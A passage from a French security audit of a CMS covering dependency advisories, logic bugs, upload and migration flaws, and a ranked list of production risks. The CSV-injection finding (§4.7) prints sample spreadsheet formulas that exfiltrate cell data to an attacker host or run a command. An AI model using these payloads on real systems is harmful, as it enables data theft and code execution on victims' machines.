| `nodemailer` ≤ 9.1.0 | **haute** | 4 avis : GHSA-8m3c-c648-2xjj (contournement de `disableFileAccess`/`disableUrlAccess`), GHSA-wmmp-3585-3rmp et GHSA-cc9r-2j5m-2m83 (**contournement de la liste de domaines destinataires → livraison vers un domaine attaquant**), GHSA-2x7j-588g-ccc2 (ReDoS quadratique dans `addressparser`). Correctif : `npm audit fix`, **non cassant**. |
| `multer` (via `@nestjs/platform-express` 10.x) | haute/modérée | 5 avis : GHSA-qvfw-j98x-7q72 (**contournement de la limite de taille de fichier** par condition de course dans `fileFilter`), GHSA-72gw-mp4g-v24j, GHSA-wc9g-mqfw-jrwm, GHSA-535w-7cp7-47q4, GHSA-3p4h-7m6x-2hcm (DoS, nettoyage incomplet des téléversements interrompus) |
| `qs` 2.2.5 – 6.15.3 | modérée | 3 avis dont GHSA-x5fp-wj9c-mxmx (contournement de `array-limit`) — **`qs` analyse précisément la query string**, donc les `filter[…]` du §3.1 |
| `@nestjs/*` 10.4.x | — | Nest 10 est en fin de maintenance ; `@nestjs/cli@12` et `platform-express@12` sont les correctifs proposés, tous deux cassants |

Le contournement de liste de domaines de `nodemailer` mérite une attention particulière : il est directement exploitable via les champs d'adresse que le CMS collecte sur des formulaires publics (contact, newsletter, candidature), et son effet est l'envoi de courriels du domaine de l'entreprise vers un domaine attaquant.

**Les trois correctifs non cassants (`npm audit fix` sur les deux projets) doivent être appliqués avant la mise en ligne.** Ils couvrent `nodemailer`, `underscore` et `@tiptap/core`.

---

## 4. Erreurs de logique métier et cas limites

### 4.1 `[DÉMONTRÉ]` `file: "[object Object]/…"` — variable hors de portée dans la réponse d'upload

```
$ curl -X POST …/api/admin/upload -F "file=@a.png" -F "module=ged" -F "id=1" -F "slug=test"
{"url":"/uploads/ged/ged_1_test.png","file":"[object Object]/ged_1_test.png",…}
```

Dans `POST`, la réponse est construite avec ``file: `${module}/${fileName}` `` alors que la variable locale s'appelle `folder` (renommée, dit le commentaire, parce que *« le lint du projet interdit une liaison qui écrase ce mot »*). Le renommage a été fait sur la déclaration et sur `getModuleDir(folder)`, **mais pas sur cette interpolation** : `module` y désigne donc l'objet CommonJS `module`, qui se sérialise en `[object Object]`.

Le fichier est bien écrit, l'`url` est juste — seul `file` est faux. C'est précisément le champ que les appelants utilisent comme référence GED (`gedStore.patchAsset({ file })`, renommage, suppression). Tout consommateur qui stocke `file` pointe vers un chemin inexistant, et échouera plus tard, loin de la cause. Le correctif est d'un mot ; la détection exige de lire la réponse, pas le code de statut.

### 4.2 `[DÉMONTRÉ]` Slug vide pour un titre en emoji ou en ponctuation

`slugify` conserve l'Unicode — bon choix, documenté, et l'arabe passe correctement :

```
"ÀÁÂÃ"                  -> "àáâã"
"مرحبا بالعالم"          -> "مرحبا-بالعالم"
"日本語タイトル"            -> "日本語タイトル"
"🎉 Party 🥳"           -> "party"
"Héllo—Wörld‽"          -> "hello-world"
"İstanbul ııı"          -> "istanbul-ııı"
"  --__--  "            -> ""
""                      -> ""
```

Mais un titre **sans aucune lettre ni chiffre** produit une chaîne vide, et les onze services concernés l'acceptent :

```ts
// news.service.ts, events, pages, products, authors, careers, services, solutions…
if (!out.slug && out.title) out.slug = slugify(String(out.title));
```

`slugify('🎉🥳')` → `''`. Le slug vide est persisté. Or le schéma déclare `@@unique([slug, locale])` : **la deuxième actualité à titre emoji de la même langue provoque une violation d'unicité**, remontée en 409 dont le message ne mentionne ni le slug ni le titre. Le rédacteur voit « conflit » sans comprendre.

La preuve que le risque était connu : `catalog-import.service.ts` garde le même appel, **avec** un repli —

```ts
const base = slugify(String(row.slug ?? row.name ?? … ?? 'item')) || 'item';
const slug = slugify(key) || key;
```

Le repli existe donc quelque part et pas ailleurs. Il manque dans les onze `beforeSave`.

Deux incohérences secondaires du même `slugify` : la translittération des accents dépend de la présence d'une lettre ASCII (`ÀÁÂÃ` seul garde ses accents, `Héllo` les perd) — donc des URL aux formes imprévisibles ; et le résultat n'est pas tronqué à une limite sûre pour un index MySQL `utf8mb4` (300 `a` passent tels quels).

### 4.3 `[DÉMONTRÉ]` Sept violations des règles des hooks — plantages au rendu

`npx eslint` remonte `react-hooks/rules-of-hooks` **7 fois**, dont deux dans du code vivant :

```
components/admin/ProcessFlow.tsx:43
  React Hook "useTranslations" is called conditionally.
components/sections/AlternatingSections.tsx:105
  React Hook "useEffect" is called conditionally.
data/translations.js:44,47,50,103,114   (code mort — cf. 5.1)
```

`ProcessFlow.tsx` :

```ts
if (!steps.length) {
  const t = useTranslations('admin.editor');   // ← hook après un return conditionnel
  return <p …>{t('noProcess')}</p>;
}
```

`AlternatingSections.tsx` :

```ts
if (!items.length) return null;
…
useEffect(() => { …IntersectionObserver… }, [items.length]);   // ← hook après un return
```

**Le second est sur la vitrine publique.** Dès que `items.length` bascule entre 0 et non-0 au cours de la vie du composant (blocs d'accueil chargés de façon asynchrone, puis vidés par un changement de langue ou une rétraction de l'API), React lève *« Rendered fewer hooks than during the previous render »* et **démonte l'arbre**. Sans frontière d'erreur — et ESLint signale justement `react-hooks/error-boundaries` 2 fois — le plantage emporte la section entière de la page d'accueil.

`react-hooks/refs` (7 occurrences : `admin/builder`, `AdminHtmlEditor`, `NewsletterSignup`, `use-group-filter`) signale des accès à des refs **pendant** le rendu, et `react-hooks/immutability` (6) des fonctions appelées avant leur déclaration dans le corps du composant — les deux produisent des états incohérents en mode Strict/ Concurrent, donc des comportements différents entre dev et production.

### 4.4 `[LECTURE]` Synchronisation CRM en O(n) avec échec silencieux

`lib/crm-store.ts` :

```ts
localStorage.setItem(ORDERS_KEY, JSON.stringify(orders));
void import('@/lib/crm-sync').then((m) => m.pushCollection('orders', orders)).catch(() => {});
```

`pushCollection` pousse **chaque ligne de la collection**, pas la ligne modifiée :

```ts
export function pushCollection(resource, rows) {
  void Promise.all(rows.map((row) => push(resource, row)));
}
```

Modifier une commande sur 500 déclenche **500 requêtes HTTP** (`PATCH` pour celles déjà mappées, `POST` sinon). Au plafond de 120 req/min mesuré plus haut, la quasi-totalité reçoit 429 — et `push()` avale tout :

```ts
} catch { /* Silencieux : la synchronisation reprendra au prochain pull(). */ }
```

**Mais `pull()` ne reprend rien** : il écrase le cache local avec l'état du serveur. Les lignes jamais poussées sont donc **définitivement perdues** au prochain montage, sans aucun message. C'est le scénario exact de la perte de commandes en production.

`pull()` contient en outre une fragilité d'identifiant : `const localId = Number(row.id) || index + 1` — avec le driver JSON, les identifiants sont des UUID, `Number()` donne `NaN`, et l'identifiant local devient la position dans la page. Deux tris différents produisent deux mappages différents, et `push` se met à écrire sur la mauvaise ligne.

### 4.5 `[LECTURE]` Concurrences d'écriture non protégées

**Driver JSON** (`json-repository.ts`) — lecture-modification-écriture hors de la file :

```ts
async create(data) {
  const all = [...this.store.read(this.collection), entity];   // lecture hors file
  await this.store.write(this.collection, all);                // écriture en file
}
private nextId() { …return max + 1; }                          // max calculé avant l'attente
```

`JsonStore.write` sérialise bien les écritures par collection, mais **la paire lecture/écriture ne l'est pas**. Deux créations concurrentes lisent le même tableau de base, ajoutent chacune leur ligne, et la seconde écrase la première : **enregistrement perdu**, avec en prime un `id` dupliqué (`max+1` identique). `read()` est synchrone et `write()` fait `fs.writeFileSync` : le pilote bloque la boucle événementielle à chaque écriture. Le commentaire du fichier l'assume (*« not for multi-instance »*) — mais `DB_DRIVER=json` est la **valeur par défaut de `.env.example`**, et rien n'empêche de la déployer telle quelle.

**Côté front**, trois écritures non atomiques :

```
lib/seo.ts:50            await fs.writeFile(FILE, JSON.stringify(store, null, 2));
lib/verification.ts:229  await fs.writeFile(FILE, JSON.stringify(store, null, 2), 'utf8');
lib/translate-store.ts:134,149,154   await fs.writeFile(…)
```

contre deux écritures correctes (`tmp` + `rename`) :

```
lib/newsletter-store.ts:67-69    const tmp = `${FILE}.tmp`; await fs.writeFile(tmp,…); await fs.rename(tmp, FILE);
lib/home/store.ts:82-84          idem
```

Une interruption entre l'ouverture et la fin d'écriture laisse un JSON tronqué. Pour `data/verification.json`, cela efface la configuration d'API au prochain démarrage. La convention existe dans le projet — elle n'est pas appliquée partout.

**Enfin, un problème d'hébergement qui domine tous les autres :** le front écrit dans `data/`, `messages/`, `translate/` et `public/uploads`, c'est-à-dire **dans son propre répertoire de déploiement**. Sur un déploiement immutable (conteneur, Vercel, ou tout `git pull && next build`), ces écritures sont perdues au redéploiement ; en mode cluster PM2, chaque instance a son disque en mémoire et diverge. Toute modification de traduction, de SEO ou de média faite depuis le back-office **disparaît au prochain déploiement**.

### 4.6 `[DÉMONTRÉ]` `next start` ne sert pas les fichiers ajoutés après le build

```
=== next start (production) ===
GET /uploads/ged/ged_1_test.png  -> 404
GET /__audit_probe.txt           -> 404     (fichier ajouté à public/ après le build)
GET /favicon.ico                 -> 200     (présent au build)

=== next dev ===
GET /uploads/ged/ged_1_test.png  -> 200  type=image/png
```

C'est le comportement documenté de Next.js : seuls les assets présents dans `public/` **au moment du build** sont servis. Toute la médiathèque écrit dans `public/uploads` à l'exécution → **en production, chaque image téléversée depuis le back-office renvoie 404**. Personne ne le voit en développement, où ça marche.

**Et les deux findings s'arment l'un l'autre.** Pour corriger ces 404, il faudra servir `/uploads` hors de Next — alias nginx/LiteSpeed ou CDN pointé sur le dossier. C'est la bonne correction. Mais **à l'instant où elle est appliquée, le §2.3 devient exploitable en production** : le `.html` téléversé anonymement sera servi en `text/html` par le serveur web, exactement comme le serveur de développement le fait aujourd'hui. Corriger la disponibilité sans corriger l'authentification et les extensions transforme un bug visible en faille critique invisible. **Les deux correctifs doivent partir ensemble.**

### 4.7 `[LECTURE]` Injections CSV dans les exports comptables

`lib/payments.ts` :

```ts
const esc = (v) => `"${String(v ?? '').replace(/"/g, '""')}"`;
```

L'échappement des guillemets est correct, mais rien ne neutralise un premier caractère `=`, `+`, `-`, `@`, ni les séquences tabulation/retour chariot. Un nom de client saisi sur un formulaire **public** vaut `=HYPERLINK("http://attacker.tld?"&A1;"cliquer")` ou `=cmd|'/C calc'!A0`, l'export CSV est ouvert dans Excel par le service comptable, et la formule s'exécute. Les champs concernés (`client`, `email`, `note`, `orderCode`) proviennent tous de saisies non authentifiées.

Même schéma à vérifier dans les autres exports (`newsletter/report/export`, `lib/recruitment.ts`).

### 4.8 `[LECTURE]` Monnaie en virgule flottante, arrondi à l'affichage seulement

```ts
export function lineNet(item) { return qty * price * (1 - disc / 100); }
const subtotal = items.reduce((s, it) => s + lineNet(it), 0);
export function money(n, suffix?) { return `${Math.round(n).toLocaleString('fr-DZ')} ${symbol}`; }
```

Aucun arrondi intermédiaire, aucune conversion en unités mineures : les totaux accumulent l'erreur binaire (`0.1 + 0.2 ≠ 0.3`). `money()` arrondit à **l'unité entière** — les centimes disparaissent de l'affichage alors qu'ils existent dans le total stocké. La page de paiement, elle, affiche `formatMoney(order.totalAmount, { decimals: 2 })` : **deux fonctions d'arrondi différentes pour le même montant**, donc deux valeurs possibles à l'écran selon l'écran. À rapprocher du §2.5 : aucun de ces montants n'est de toute façon recalculé côté serveur.

### 4.9 `[LECTURE]` Permissions : action déduite de l'URL

`permissions.guard.ts` :

```ts
function inferAction(req) {
  const url = req.url || '';
  if (url.includes('/purge')) return 'delete';
  if (url.includes('/restore')) return 'update';
  if (method === 'POST' && /\/\d+\//.test(url)) return 'update';
  …
}
```

L'action exigée est **devinée depuis la chaîne d'URL** quand le décorateur `@RequirePermissions` est absent. Trois faiblesses : la règle `/\/\d+\//` ne reconnaît que des identifiants **numériques** — avec le driver JSON (identifiants UUID), `POST /users/6d38cd29-…/partner-code` retombe sur `create` au lieu d'`update`, donc sur une permission différente de celle voulue ; toute route future dont le chemin contient `/purge` ou `/restore` en sous-chaîne hérite d'une action non voulue ; et le repli final est `return 'read'`, c'est-à-dire **la permission la plus faible** pour une méthode non reconnue. Un garde qui devine échoue silencieusement dans le sens permissif.

À noter aussi : `resolvePermissions` met en cache 60 secondes par `perms:<userId>:<roleId>`. Modifier les permissions **d'un rôle** n'invalide rien — jusqu'à 60 s de décalage entre la décision affichée et la décision appliquée.

---

## 5. Code mort, duplication, scripts cassés

### 5.1 `[DÉMONTRÉ]` Code mort

| Élément | Preuve |
|---|---|
| `data/translations.js` (3,5 Ko) | `grep -rn "translations.js\|LanguageProvider\|window.useTranslation"` sur `app/ components/ lib/ contexts/` → **0 résultat**. Fichier autonome posant un `window.LanguageProvider` avec 5 hooks, seul responsable de 5 des 7 erreurs `rules-of-hooks`. |
| `scripts/import-json-to-db.js` **et** `.ts` | Deux versions du même script, l'une en JS `require()`, l'autre en TS avec 4 `any`. Ni l'une ni l'autre n'est référencée par `package.json`. |
| `scripts/build-messages.js`, `clean-json-files.js`, `fix-json-spaces.js` | 9 erreurs `no-require-imports`, aucun rattachement à un script `npm`. |
| `npm run lint` | `next lint` **supprimé dans Next 16** : `Invalid project directory provided, no such directory: /home/user/sariCMS/lint`. Le script de lint du projet ne fonctionne pas — c'est pourquoi 269 erreurs n'ont jamais bloqué personne. |
| `npm run test:e2e` (backend) | `jest --config ./test/jest-e2e.json` — **`backend/test/` n'existe pas**. |
| `backend/sql/migrate-data.mysql.sql` | 327 Ko de données générées versionnées dans Git. |
| `app/api/admin/ged/asset/route.ts` | `const withState = …get('state') === '0' ? manifest : manifest;` — les deux branches renvoient la même valeur. |

### 5.2 Duplication à risque

Le cas le plus grave est traité au §2.4 : **deux implémentations de la GED**, `lib/ged/store.mjs` (front) et `backend/src/modules/ged/ged.service.ts` (API), avec leurs deux tables de préfixes (`lib/ged/prefix.mjs`, `backend/src/modules/ged/ged-prefix.policy.ts`). Celle du backend est protégée et testée ; celle du front l'est aussi ; mais la **route historique** `/api/admin/upload` n'utilise ni l'une ni l'autre pour son chemin `multipart`, et c'est elle qui est exposée sans authentification. Trois chemins d'écriture vers le même dossier, deux sécurisés, un ouvert.

Autres doublons : `lib/date-utils.ts` (2,5 Ko) à côté de `lib/date-format.ts` (12 Ko) ; `lib/slugify.ts` côté front à côté de `slugify()` dans `backend/src/common/crud/query.util.ts` — **deux fonctions de slug aux règles différentes** pour le même champ, donc des URL qui peuvent diverger entre ce que le front génère et ce que l'API enregistre.

### 5.3 TODO / FIXME

Recherche exhaustive sur `app/ lib/ components/ contexts/ backend/src/ backend/prisma/ scripts/ translate/` :

```
$ grep -rnIE "(TODO|FIXME|HACK|XXX|@deprecated|WIP)" …
app/[locale]/admin/taxonomies/page.tsx:27   /** Traduit un label d'onglet via admin.taxonomies.tab_XXX_YYY */
app/[locale]/admin/taxonomies/page.tsx:34   /** Traduit un hint via admin.taxonomies.hint_XXX_YYY */
components/admin/fields/FieldKit.tsx:30     // Navigate: messages.admin.editor.option_XXX
components/sections/ParallaxSection.tsx:28  /** @deprecated Ancienne interface, conservée… */
```

**Trois occurrences, toutes des motifs de nommage (`XXX` = substitut de clé), zéro vraie dette balisée.** C'est un excellent signal : ce projet ne laisse pas de chantiers ouverts dans les commentaires. Le seul `@deprecated` est assumé et expliqué.

Le revers : la dette n'est pas marquée **parce qu'elle n'est pas connue**. Rien dans le code ne signale que `POST /users` est inaccessible au public (§2.6), que les prix ne sont pas revérifiés (§2.5) ou que le throttle est global (§3.4). L'absence de TODO n'est pas ici une preuve de finition — c'est le signe qu'aucune revue de sécurité n'a eu lieu.

### 5.4 Hygiène de dépôt — ce qui est bon

À porter au crédit du projet : `.gitignore` couvre `.env`, `.env.local` et `public/uploads/*` (avec `.gitkeep` conservé) ; `backend/.env.example` porte la mention *« Never commit secrets »* et la commande de génération d'un secret fort ; **aucun secret réel n'est commité** — la recherche ciblée sur les motifs `api_key|secret|password|token` suivis d'une valeur ne remonte que les comptes de démonstration du §2.6/§2.7, qui sont un problème de *conception*, pas une fuite de credential de production.

---

## 6. Cohérence front ↔ back ↔ base de données

### 6.1 `[DÉMONTRÉ]` Aucune migration Prisma initiale

```
$ ls backend/prisma/migrations/
20260825_add_slug_to_partners
20260825_add_startdate_to_events
20260825_add_translation_fields
20260825_add_translation_to_all_modules
20260826_add_color_image_to_services
20260906_add_home_sections_and_newsletter
20260907_add_newsletter_unsubscribe_reason
```

Sept migrations, **toutes des `ALTER` incrémentaux**. Aucune ne crée les tables. Or `schema.prisma` déclare **28 modèles**. Le DDL réel vit ailleurs :

```
backend/sql/schema.mysql.sql          34 Ko   ← la vraie création de schéma
backend/sql/generate-schema.mjs       10 Ko   ← généré depuis le schéma Prisma
backend/sql/fix-zero-dates.mysql.sql  79 Ko
backend/sql/fix-permissions.mysql.sql 16 Ko
backend/scripts/schema-sync.mjs               ← npm run db:schema-check / --fix
backend/scripts/test-schema-sync.mjs
```

**`prisma migrate deploy` est inutilisable en production** : sur une base vierge, il rejoue sept `ALTER` sur des tables qui n'existent pas. Le déploiement passe nécessairement par `db push` (qui n'enregistre aucun historique, donc rend toute migration future impossible) ou par le SQL généré à la main.

L'existence même de `db:schema-check`, `db:schema-fix` et d'un fichier de correction de 79 Ko pour les dates à zéro prouve que **la divergence a déjà été rencontrée en pratique**. Deux sources de vérité pour le DDL, sans arbitre automatique, c'est une divergence garantie à chaque évolution de modèle.

**Test exact à exécuter avant de choisir la stratégie :**

```bash
docker run --rm -e MYSQL_ROOT_PASSWORD=x -e MYSQL_DATABASE=sari_test -p 3307:3306 -d mysql:8
cd backend && DATABASE_URL="mysql://root:x@127.0.0.1:3307/sari_test" npx prisma migrate deploy
# attendu : échec (ALTER sur tables absentes). Confirmer ensuite :
DATABASE_URL="…" npx prisma migrate diff --from-empty --to-schema-datamodel prisma/schema.prisma --script > /tmp/attendu.sql
mysql … sari_test < sql/schema.mysql.sql
DATABASE_URL="…" npx prisma migrate diff --from-url "$DATABASE_URL" --to-schema-datamodel prisma/schema.prisma --script
# toute ligne produite ici = divergence entre le SQL livré et le schéma Prisma
```

### 6.2 `[LECTURE]` Indexation inadaptée aux requêtes publiques

Le chemin le plus fréquent en production est `WHERE deletedAt IS NULL AND status='published' AND locale=? ORDER BY date DESC LIMIT n`, émis **sans cache** (§3.4) à chaque page vue. Or :

```
model NewsArticle   @@unique([slug, locale])  @@index([status, date])  @@index([deletedAt])
model Product       @@unique([slug, locale])  @@index([category, inStock])  @@index([deletedAt])
model User          @@index([type, status])   @@index([deletedAt])   @@index([roleId])
```

`@@index([deletedAt])` est présent sur la quasi-totalité des 28 modèles et **ne sert à rien** : la colonne est `NULL` pour presque toutes les lignes, la sélectivité est nulle, MySQL l'ignore. Aucun index **composé** ne couvre `(locale, status, deletedAt, date)` — la requête publique type. `NewsArticle` a `[status, date]` mais sans `locale` ni `deletedAt`, donc il faudra filtrer puis trier sur des lignes déjà lues.

Le détail par slug passe par `findOne({ slug, locale })` : `@@unique([slug, locale])` le couvre — c'est le bon point. Mais `findPublishedEntity` essaie jusqu'à **trois requêtes** par fiche (slug complet, puis identifiant numérique, puis suffixe du slug), ce qui triple le coût du chemin détaillé en cas d'URL ancienne.

**Collation MySQL.** `email String @unique` sans `@db.VarChar(n)` ni collation explicite. En `utf8mb4_0900_ai_ci` (défaut MySQL 8), la comparaison est **insensible aux accents** : `helene@x.fr` et `hélène@x.fr` violent l'unicité alors que ce sont deux personnes distinctes. Le code applique bien `.toLowerCase().trim()`, mais ne peut rien contre la collation. À vérifier : `SHOW FULL COLUMNS FROM users LIKE 'email'`.

**Test de charge exact à jouer** (à faire sur une préproduction peuplée, jamais sur la prod) :

```bash
mysql -e "EXPLAIN SELECT * FROM news_articles WHERE deletedAt IS NULL AND status='published' AND locale='fr' ORDER BY date DESC LIMIT 20\G"
# critère : type=ref ou range, key non NULL, rows < 200. type=ALL = balayage complet.
k6 run - <<'EOF'
import http from 'k6/http';
export const options = { vus: 500, duration: '3m' };
export default function () {
  http.get('http://127.0.0.1:3101/api/v1/public/news?limit=20&locale=fr');
  http.get('http://127.0.0.1:3101/api/v1/public/products?limit=20');
  http.get('http://127.0.0.1:3101/api/v1/public/menus');
}
EOF
# attendu aujourd'hui : saturation en 429 dès les premières secondes (plafond 120/min global).
```

### 6.3 `[LECTURE]` Champs tolérés à l'écriture, rejetés silencieusement en base

`PrismaRepository.toPrisma()` écarte sans erreur toute clé absente du modèle :

```ts
if (fields && !fields.has(k) && !scalars[k]) { this.warnUnknownField(k); continue; }
```

Le choix est défendu dans un commentaire détaillé et se justifie — un `Unknown argument` de Prisma jetait des lots d'import entiers. Mais l'effet est qu'**un champ envoyé par un formulaire et non déclaré en base est perdu sans que l'utilisateur le sache** : la réponse est un 200, la fiche est enregistrée, le champ a disparu. Seul un `logger.warn` côté serveur le signale, une fois par champ et par dépôt (`warnedFields`). En production, personne ne lit ces journaux.

C'est exactement la classe de bug qui fait dire « j'ai enregistré l'adresse, elle n'y est plus ». La détection existe (`npm run db:schema-check`) mais elle est manuelle.

### 6.4 `[LECTURE]` Deux schémas d'identifiants incompatibles

Le pilote JSON produit des UUID (`"6d38cd29-414d-4d3e-8934-503eab0f6573"`, observé dans la réponse de connexion), le pilote MySQL des entiers. Le code le sait et le compense à deux endroits, avec le même commentaire recopié :

```ts
// `sub` peut être un entier (MySQL/Postgres) ou un UUID (driver JSON) :
// Number('c5c1…') vaut NaN et faisait échouer toute requête authentifiée.
const subId = (typeof rawSub === 'number' || /^\d+$/.test(String(rawSub)) ? Number(rawSub) : rawSub) as unknown as number;
```

Ce double régime est présent dans `auth.service.ts`, `jwt.strategy.ts`, `crm-sync.ts` (`Number(row.id) || index+1`), `permissions.guard.ts` (`/\/\d+\//`). Le type déclaré reste `number` partout, avec `as unknown as number` pour faire taire le compilateur. **`tsc` passe à 0 erreur parce que le mensonge de typage est explicite.** Chaque nouvel appelant qui fera `Number(id)` sans la garde cassera — et les tests, qui tournent sur le pilote JSON, ne le verront pas.

C'est le risque structurel le plus sournois du projet : **la suite de tests valide un pilote qui ne sera pas celui de la production.** Les 134 tests passent avec `DB_DRIVER=json`. Aucun ne touche `PrismaRepository` contre une vraie base MySQL — `prisma-repository.spec.ts` utilise un délégué simulé. Tout ce qui est spécifique à MySQL (dates `0000-00-00`, collations, `Unknown argument`, relations `connect`) est donc **non testé**, alors que c'est précisément là que se concentrent les commentaires de correction du code.

---

## 7. Par module critique : ce qui peut casser, et dans quelles conditions

### 7.1 Authentification

| Scénario de casse | Condition déclenchante | Gravité |
|---|---|---|
| **Reprise de compte admin** | XSS via téléversement anonyme (§2.3) ; jetons en `localStorage`, pas de CSP | Critique |
| **Jetons forgeables** | `JWT_ACCESS_SECRET` absent au déploiement → repli sur `'dev-access-secret'` (§2.8) | Critique |
| **Connexion administrateur immédiate** | déploiement avec le seed par défaut, jamais changé (§2.7) | Critique |
| **Session accordée pendant une panne** | API lente > 8 s ou injoignable → repli sur `client@sari.dz` / `demo123` (§2.6) | Haute |
| **Verrouillage de tout le monde** | pic de trafic + `trust proxy` absent → 429 global, y compris sur `/auth/login` (§3.4) | Haute |
| **2FA contournée** | `enableTotp` lit le secret dans le cache L2 **sur disque** (`storage/cache/keyv.json`), non chiffré ; un accès lecture au répertoire suffit à cloner le TOTP | Moyenne |
| **Réutilisation de refresh token** | la rotation révoque l'ancien jeton mais **aucune détection de réutilisation** n'est implémentée : un jeton volé et utilisé avant la victime reste valide | Moyenne |
| **Compte bloqué après désactivation** | `validate()` vérifie `status !== 'active'` — bon. Mais l'access token reste valide 15 min après révocation : pas de liste noire | Basse |

Point positif vérifié : `POST /auth/login` est bien limité à 10/min (`401 ×9 puis 429 ×5`), le hachage est bcrypt 12 rounds, le refresh est haché SHA-256 avant stockage, et `changePassword` exige l'ancien mot de passe **et** refuse le mot de passe identique — avec révocation des sessions. C'est un niveau de soin réel.

**Ce qui casse en premier :** le repli de session sur panne (§2.6). Il ne demande ni exploit ni identifiant — juste un ralentissement. Et le ralentissement est lui-même garanti par le §3.4.

### 7.2 Gestion de contenu

| Scénario | Condition | Gravité |
|---|---|---|
| **Défiguration du site sans identifiant** | `PUT /api/admin/translations/file` anonyme réécrit `messages/<locale>.json` (§2.2) | Critique |
| **SEO réécrit par un tiers** | `PUT /api/admin/seo` anonyme | Critique |
| **409 incompréhensible à la publication** | deux fiches au titre sans lettre (emoji, ponctuation) dans la même langue → collision sur slug vide (§4.2) | Haute |
| **Champ enregistré puis disparu** | formulaire envoie une clé absente du modèle Prisma → écartée en silence, 200 renvoyé (§6.3) | Haute |
| **Plantage de section publique** | `AlternatingSections` : hook après `return null`, bascule de `items.length` (§4.3) | Haute |
| **Perte de contenu au déploiement** | écriture dans `messages/`, `translate/`, `data/` = répertoire de déploiement (§4.5) | Haute |
| **Extraction de données non publiées** | oracle `filter[<champ>][contains]` sur les 13 endpoints publics (§3.1) | Moyenne |
| **Lecture entière de table en base** | aucun index composé `(locale,status,deletedAt,date)` + `cache: 'no-store'` (§6.2) | Moyenne |

### 7.3 Téléversement de fichiers

| Scénario | Condition | Gravité |
|---|---|---|
| **Écriture/suppression arbitraire** | `module`, `id`, `file` non assainis dans la route historique (§2.4) | Critique |
| **XSS stocké** | extension non filtrée → `.html` servi en `text/html` (§2.3) | Critique |
| **Images invisibles en production** | `next start` ne sert pas `public/` modifié après build (§4.6) | Critique (fonctionnel) |
| **Référence cassée** | `file: "[object Object]/…"` dans la réponse (§4.1) | Haute |
| **Épuisement disque** | `MAX_ASSET_BYTES = 50 Mo` côté GED, mais la route `multipart` historique n'applique **aucune limite de taille** ; `multer` est de plus touché par GHSA-qvfw-j98x-7q72 (contournement de limite) | Haute |
| **Inode / quota** | l'hébergement est annoncé à 600 000 inodes ; chaque asset GED écrit jusqu'à **4 fichiers** (rendu, `.svg`, `.sari.json`, `.sari.canvas.json`) plus une copie `-vN` par version, l'historique étant conservé jusqu'à 20 versions | Moyenne |
| **Écrasement silencieux** | `archivePrevious` fait `fs.copyFile(…).catch(() => undefined)` : un échec d'archivage est avalé, l'ancien rendu est écrasé sans version de secours | Moyenne |

Point positif : `lib/ged/store.mjs` et `ged.service.ts` sont **correctement** protégés (refus de `..`, des chemins absolus, de l'octet nul ; liste blanche d'extensions ; test d'évasion dans la suite). Le problème n'est pas la GED, c'est la route historique qui coexiste avec elle.

### 7.4 Formulaires publics

| Formulaire | État | Risque |
|---|---|---|
| **Contact** | `POST /contact/messages` est `@Public()` avec `@Throttle({limit:5, ttl:60_000})`, DTO borné (`name` 2–120, `message` 10–4 000, `@IsEmail`), `forbidNonWhitelisted` | Correct. **Mais aucun captcha ni honeypot** : 5/min/IP, et l'IP est celle du proxy (§3.4) → soit le formulaire est inutilisable en pic, soit le spam passe en tournant sur l'en-tête. Le contenu est stocké brut ; son rendu en back-office doit être vérifié contre l'XSS. |
| **Newsletter** | voir §3.5 | **Fuite du jeton de désabonnement, énumération d'adresses, effacement de masse, PII exposée.** Le captcha existe côté vitrine (`/api/newsletter/captcha`) mais **pas sur l'endpoint de l'API**, qui est directement joignable. |
| **Vérification de document** | Le mieux conçu du projet : captcha à usage unique, limite 12/5 min, validation de forme (`CODE_SHAPE`, `KEY_SHAPE`), refus de répondre « valide » sur un code inconnu (502 plutôt qu'un faux vert), repli local explicite et signalé | **`clientIp()` lit `x-forwarded-for` fourni par le client** → limite contournable, et chaque requête déclenche un appel à une API externe payante (§3.4) |
| **Candidature / devis** | `POST /applications`, `/quotes` exigent une permission côté API ; le front passe par `crm-sync` | Les envois publics aboutissent dans `localStorage`, pas en base (§4.4) |
| **Inscription** | `POST /users` → 403 pour un anonyme | **Ne fonctionne pas** (§2.6) |

### 7.5 Paiement et commandes

Couvert au §2.5. Résumé des conditions de casse — toutes certaines, pas probabilistes :

- le marchand ne reçoit **aucune** commande : `addOrder` n'appelle jamais l'API ;
- une commande est marquée `paid` par le navigateur du client, sans encaissement ;
- le visiteur crée ses propres coupons à 100 % dans `localStorage.sari_coupons` ;
- le visiteur envoie `price: 0.01` et rien ne le recalcule ;
- l'administrateur voit cinq paiements fictifs et les exporte en CSV ;
- la sauvegarde CRM émet n requêtes pour une modification, échoue en silence, puis `pull()` écrase le cache → **perte définitive**.

---

## 8. Les 5 risques les plus probables en production

Classement par **probabilité × impact**, en scénario concret et non en catégorie de faille.

### Risque n° 1 — Saturation générale par le limiteur de débit au premier pic
**Probabilité 95 % · Impact 9/10 · Score 8,6**

Ce n'est pas un risque conditionnel : c'est le comportement **mesuré** du système (§3.4, 119 réponses puis 11 × 429 sur 130 requêtes d'un seul client) confronté à la charge annoncée (500 simultanés × 6–10 appels par page). L'absence de `trust proxy` fait que le plafond de 120 req/min est partagé par tous les visiteurs. `cache: 'no-store'` garantit qu'aucune requête n'est économisée.

**Ce que voit le client :** le site se met à afficher du contenu figé (repli sur les JSON statiques) puis des erreurs, sans journalisation exploitable puisque `req.ip` vaut l'adresse du proxy pour tout le monde. **Ce que voit l'exploitant :** rien d'anormal dans les métriques, l'API répond — en 429.

C'est le risque n° 1 parce qu'il est certain, qu'il frappe dès le premier jour de trafic réel, et qu'il est **invisible au diagnostic** : le symptôme ressemble à une panne de base ou à un manque de RAM, pas à un en-tête de proxy manquant.

*Correctif — 2 lignes, à faire avant tout le reste :* `app.set('trust proxy', 1)` dans `main.ts` + un `getTracker` explicite ; sortir les endpoints publics du throttle global ; retirer `cache: 'no-store'` des lectures publiques.

### Risque n° 2 — Aucune commande ni paiement n'atteint le serveur
**Probabilité 100 % · Impact 10/10 · Score 10,0 (mais hors périmètre de « bug » : c'est une fonctionnalité absente)**

Score maximal en probabilité × impact, et je le place second uniquement parce que **ce n'est pas une régression** : le tunnel n'a jamais fonctionné côté serveur. Il n'empêche que c'est le risque métier le plus coûteux du projet. Des visiteurs passeront commande, verront une confirmation, et le marchand ne sera jamais informé. Pire : l'écran de comptabilité affichera des paiements fictifs qui masqueront l'absence de paiements réels.

